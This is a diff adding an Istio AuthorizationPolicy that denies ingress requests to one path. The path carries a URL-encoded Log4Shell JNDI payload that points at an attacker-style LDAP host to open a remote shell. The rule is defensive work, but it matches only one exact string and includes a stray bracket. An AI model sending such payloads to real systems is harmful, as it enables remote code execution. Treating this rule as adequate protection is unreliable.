@@ -1,0 +1,14 @@
+apiVersion: security.istio.io/v1beta1
+kind: AuthorizationPolicy
+metadata:
+  name: blockauthlog4shell
+spec:
+  selector:
+    matchLabels:
+      app: istio-ingressgateway
+  action: DENY
+  rules:
+  - to:
+    - operation:
+        methods: ["*"]
+        paths: ["/todolist/todo/search.action?title=%24%7Bjndi%3Aldap%3A%2F%2Fldap.darkweb%3A80%2F%23RemoteShell%7D]"]
